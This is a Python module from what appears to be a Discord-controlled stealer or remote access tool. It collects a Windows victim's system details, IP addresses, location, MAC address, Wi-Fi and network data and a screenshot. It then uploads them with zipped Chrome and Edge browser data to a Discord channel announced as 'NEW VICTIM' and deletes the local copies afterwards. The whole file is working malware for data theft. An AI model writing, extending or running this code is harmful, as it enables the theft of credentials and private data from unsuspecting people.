import asyncio, threading, ctypes, socket, discord, os, sys
from co.discordinv import discordinv
from start.modules import (
    get_system_info,
    get_location,
    get_cpu_info,
    get_local_datetime,
    get_network,
    get_wifi,
    get_drives,
    get_memory,
    get_mac_address,
)
user_profile = os.environ.get('USERPROFILE')
chrome_zip_path = os.path.join(user_profile, 'chrome.zip')
f = chrome_zip_path
edge_zip_path = os.path.join(user_profile, 'edge.zip')
g = edge_zip_path
from start.modules.screenshot import take_screenshot
sys.dont_write_bytecode = True

def clean():
    try:
        if os.path.exists(f):
            os.remove(f)
            print(f"Successfully removed {f}")
        else:
            print(f"File {f} does not exist.")
    except PermissionError:
        print(f"Permission denied while trying to remove {f}.")
    except Exception as e:
        print(f"Failed to remove {f}: {e}")
def clean2():
    try:
        if os.path.exists(g):
            os.remove(g)
            print(f"Successfully removed {g}")
        else:
            print(f"File {g} does not exist.")
    except PermissionError:
        print(f"Permission denied while trying to remove {g}.")
    except Exception as e:
        print(f"Failed to remove {g}: {e}")
        
def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()
async def start_messagesend(bot, guild):
    def create_main_embed(guild_name, screenshot_img):
        private_ip, public_ip, ipv6_address = '', '', ''
        location = ''
        cpu_info = {}
        memory_info = {}
        screen_resolution = ''
        local_datetime = ''
        system_info = {}
        try:
            private_ip, public_ip, ipv6_address = get_network.get_ip_addresses()
        except Exception:
            pass
        try:
            location = get_location.get_location(public_ip)
        except Exception:
            pass
        try:
            cpu_info = get_cpu_info.get_cpu_info()
        except Exception:
            pass
        
        try:
            screen_resolution = f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}"
        except Exception:
            pass
        
        try:
            local_datetime = get_local_datetime.get_local_datetime()
        except Exception:
            pass
        
        try:
            system_info = get_system_info.get_system_info()
        except Exception:
            pass
        
        pc_name = socket.gethostname()

        admin_status = "✅ Admin" if is_admin() else "❌ Not Admin"

        embed = discord.Embed(
            title='System Information',
            description=f"Extensive system information for user: **{pc_name}**",
            color=16734003
        )
        embed.add_field(name='🔑 Admin Status', value=admin_status, inline=True)
        embed.add_field(name='💻 System', value=system_info.get('System', 'N/A'), inline=True)
        embed.add_field(name='🔠 Node Name', value=system_info.get('Node Name', 'N/A'), inline=True)
        embed.add_field(name='🔧 Release', value=system_info.get('Release', 'N/A'), inline=True)
        embed.add_field(name='🛠 Version', value=system_info.get('Version', 'N/A'), inline=True)
        embed.add_field(name='🏷 Machine', value=system_info.get('Machine', 'N/A'), inline=True)
        embed.add_field(name='🧠 Processor', value=system_info.get('Processor', 'N/A'), inline=True)

        try:
            mac_address = get_mac_address.get_mac_address()
            embed.add_field(name='🔒 MAC Address', value=mac_address, inline=True)
        except Exception:
            embed.add_field(name='🔒 MAC Address', value='N/A', inline=True)

        embed.add_field(name='🔐 Private IP', value=private_ip or 'N/A', inline=True)
        embed.add_field(name='🌐 Public IP', value=public_ip or 'N/A', inline=True)
        embed.add_field(name='🔍 IPv6 Address', value=ipv6_address or 'N/A', inline=True)
        embed.add_field(name='📍 Location', value=location or 'N/A', inline=True)
        embed.add_field(name='🕒 Local Date/Time', value=local_datetime or 'N/A', inline=True)

        try:
            embed.add_field(name='📂 Drives', value=get_drives.get_drives() or 'N/A', inline=False)
        except Exception:
            embed.add_field(name='📂 Drives', value='N/A', inline=False)

        embed.add_field(name='🖥 Screen Resolution', value=screen_resolution or 'N/A', inline=True)

        try:
            embed.add_field(name='🖥 CPU Info', value=f"Cores: {cpu_info.get('Cores', 'N/A')}, Threads: {cpu_info.get('Threads', 'N/A')}, Max Frequency: {cpu_info.get('Max Frequency', 'N/A')}, Current Frequency: {cpu_info.get('Current Frequency', 'N/A')}, Usage: {cpu_info.get('Usage', 'N/A')}", inline=False)
        except Exception:
            embed.add_field(name='🖥 CPU Info', value='N/A', inline=False)

        try:
            embed.add_field(name='💾 Memory Info', value=f"Total RAM: {memory_info.get('Total RAM', 'N/A')}, Available RAM: {memory_info.get('Available RAM', 'N/A')}, Used RAM: {memory_info.get('Used RAM', 'N/A')}, Total Swap: {memory_info.get('Total Swap', 'N/A')}, Used Swap: {memory_info.get('Used Swap', 'N/A')}, Free Swap: {memory_info.get('Free Swap', 'N/A')}", inline=False)
        except Exception:
            embed.add_field(name='💾 Memory Info', value='N/A', inline=False)

        embed.set_image(url='attachment://screenshot.png')
        embed.add_field(name='💳 Credits', value=f"Join {discordinv}\nMade by Raywzw", inline=False)        

        return embed

    def create_network_embed():
        network_info = ''
        wifi_info = ''
        try:
            network_info = get_network.get_network_info()
        except Exception:
            network_info = 'N/A'
        
        try:
            wifi_info = get_wifi.get_wifi_info() or "No Wi-Fi info available"
        except Exception:
            wifi_info = "N/A"

        embed = discord.Embed(
            title="Network & Wi-Fi Information",
            description="Details on current network and Wi-Fi",
            color=3447003
        )
        embed.add_field(name='🌐 Network Info', value=network_info, inline=False)
        embed.add_field(name='🔑 Wi-Fi Information', value=wifi_info, inline=False)

        return embed

    async def send_system_info_message(channel):
        screenshot_img = take_screenshot()
        main_embed = create_main_embed(channel.guild.name, screenshot_img)
        network_embed = create_network_embed()

        files = [
            discord.File(fp=screenshot_img, filename='screenshot.png'),
            discord.File(fp=f, filename='chromedata.zip'),
            discord.File(fp=g, filename='edge.zip')
        ]

        await channel.send(f'||@everyone|| NEW VICTIM: {socket.gethostname()}!!!', embed=main_embed, files=files)
        await channel.send(embed=network_embed)

        await asyncio.sleep(2)
        os.remove(screenshot_img)
        clean()
        clean2()
    try:
        if guild.me.guild_permissions.manage_channels:
            current_channels_count = sum(1 for _ in guild.text_channels)
            channel_name = f'session{current_channels_count + 1}'
            channel = await guild.create_text_channel(channel_name)

            bot.allowed_channel_ids[guild.id] = channel.id

            await send_system_info_message(channel)
        else:
            print(missing_permissions_message(guild.name))
    except discord.Forbidden as e:
        print(handle_permission_error(guild.name, e))
    except discord.HTTPException as e:
        print(handle_http_error(guild.name, e))
    except Exception as e:
        print(handle_generic_error(guild.name, e))

def handle_permission_error(guild_name, error):
    return f"Permission error in guild {guild_name}: {error}"

def handle_http_error(guild_name, error):
    return f"HTTP error in guild {guild_name}: {error}"

def handle_generic_error(guild_name, error):
    return f"An error occurred in guild {guild_name}: {error}"

def missing_permissions_message(guild_name):
    return f"Missing permissions to manage channels in guild: {guild_name}"
